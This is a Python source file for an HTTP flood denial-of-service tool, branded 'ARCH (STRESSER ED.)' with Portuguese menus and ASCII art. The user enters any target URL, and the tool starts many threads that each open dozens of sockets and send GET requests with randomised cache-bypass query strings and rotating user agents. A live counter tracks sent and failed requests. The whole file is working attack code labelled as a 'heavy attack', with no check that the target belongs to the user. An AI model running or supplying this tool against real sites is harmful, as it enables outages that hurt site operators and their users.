import socket
import sys
import time
import threading
import random
import urllib.parse
from colorama import init, Fore, Style

# Inicializa colorama
init(autoreset=True)

# Variáveis globais para contagem
enviados = 0
falhas = 0
lock = threading.Lock()

def mostrar_ascii():
    # A SUA ARTE ASCII ORIGINAL
    arte = r"""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████████████████████████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██                                  ██▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██                                      ██▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒        ▒▒▒▒▒▒▒▒        ██                                      ██▒▒▒▒▒▒▒▒▒▒
                                ██                                      ██▒▒▒▒▒▒▒▒▒▒
                                ██                      ████            ██▒▒████▒▒▒▒
                                ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▒▒▒▒██▓▓▓▓▓▓▓▓▓▓████▒▒▒▒██▒▒
        ▓▓▓▓▓▓▓▓      ████      ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▒▒▒▒▒▒██▓▓▓▓▓▓▓▓██▒▒▒▒▒▒██▒▒
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒██▓▓▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▒▒▒▒▒▒▒▒████████▒▒▒▒▒▒▒▒██▒▒
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▒▒▒▒██▓▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▒▒▒▒████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓████▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒  ██▒▒▒▒▒▒▒▒▒▒  ██▒▒▒▒██
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒████▒▒▒▒▒▒██▒▒████▒▒▒▒██
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░██
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒░░░░▒▒██▒▒▒▒██▒▒▒▒██▒▒░░░░██
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒██████████████▒▒▒▒██▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒▒▒██████████████████████████████████████████▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██▒▒▒▒████▒▒██▒▒▒▒██▒▒▒▒▒▒▒▒▒▒██▒▒▒▒██▒▒██▒▒▒▒██▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████████▒▒▒▒██████▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████▒▒▒▒████▒▒▒▒▒▒▒▒▒▒

    """
    print(Fore.CYAN + arte)

class StresserEngine:
    """Motor de ataque baseado no Stresser.py"""
    def __init__(self, url, workers=50, sockets=30):
        self.url = url
        self.workers = workers
        self.sockets = sockets
        
        parsed = urllib.parse.urlparse(url)
        self.host = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        self.path = parsed.path or '/'
        
        self.useragents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/68.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15'
        ]

    def buildblock(self, size):
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return ''.join(random.choice(chars) for _ in range(size))

    def generate_headers(self):
        ua = random.choice(self.useragents)
        # Query string dinâmica para bypass de cache (técnica do Stresser.py)
        query = f"?{self.buildblock(random.randint(3,8))}={self.buildblock(random.randint(3,8))}"
        headers = (
            f"GET {self.path}{query} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: */*\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        ).encode()
        return headers

    def worker_task(self):
        global enviados, falhas
        while True:
            try:
                conns = []
                # Abre múltiplos sockets por thread (técnica do Stresser.py)
                for _ in range(self.sockets):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((self.host, self.port))
                    conns.append(s)
                
                for s in conns:
                    s.sendall(self.generate_headers())
                    with lock:
                        enviados += 1
                
                for s in conns:
                    s.close()
            except:
                with lock:
                    falhas += 1
                time.sleep(0.1)

def monitor():
    while True:
        with lock:
            sys.stdout.write(f"\r{Fore.GREEN}[+] ENVIADOS: {enviados} | {Fore.RED}[-] FALHAS: {falhas} | {Fore.YELLOW}[*] STRESS ATIVO")
            sys.stdout.flush()
        time.sleep(0.2)

def iniciar_ataque():
    global enviados, falhas
    enviados = 0
    falhas = 0
    
    print(f"\n{Fore.CYAN}Digite a URL Alvo (ex: http://alvo.com): ")
    target = input(f"{Fore.WHITE}> ").strip()
    if not target.startswith("http"):
        print(Fore.RED + "URL inválida!")
        return
    
    try:
        w = int(input("Intensidade (Workers) [50]: ") or 50)
        s = int(input("Canais (Sockets por Worker) [30]: ") or 30)
    except:
        w, s = 50, 30

    engine = StresserEngine(target, w, s)
    
    print(f"\n{Fore.MAGENTA}[!!!] INICIANDO MOTOR DE STRESS [!!!]")
    print(f"{Fore.YELLOW}[!] Pressione Ctrl+C para voltar ao menu.")

    threading.Thread(target=monitor, daemon=True).start()

    for _ in range(w):
        threading.Thread(target=engine.worker_task, daemon=True).start()

    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[*] Ataque finalizado.")

def mostrar_creditos():
    print(f"\n{Fore.MAGENTA}{'='*40}")
    print(f"{Fore.WHITE}{Style.BRIGHT}         ARCH (STRESSER ED.)")
    print(f"{Fore.MAGENTA}{'='*40}")
    print(f"{Fore.CYAN}Desenvolvido por: {Fore.YELLOW}Arch")
    print(f"{Fore.CYAN}Motor: {Fore.YELLOW}by arch(arch)")
    print(f"{Fore.MAGENTA}{'='*40}")
    input(f"\n{Fore.WHITE}Pressione Enter para voltar...")

def menu():
    while True:
        mostrar_ascii()
        print(f"{Fore.YELLOW}{Style.BRIGHT}      MENU PRINCIPAL (STRESSER EDITION)")
        print(f"{Fore.CYAN}1 - Iniciar Ataque Pesado")
        print(f"{Fore.CYAN}2 - Créditos")
        print(f"{Fore.CYAN}3 - Sair")
        
        escolha = input(f"\n{Fore.WHITE}Escolha: ")
        if escolha == "1": iniciar_ataque()
        elif escolha == "2": mostrar_creditos()
        elif escolha == "3": sys.exit()

if __name__ == "__main__":
    menu()
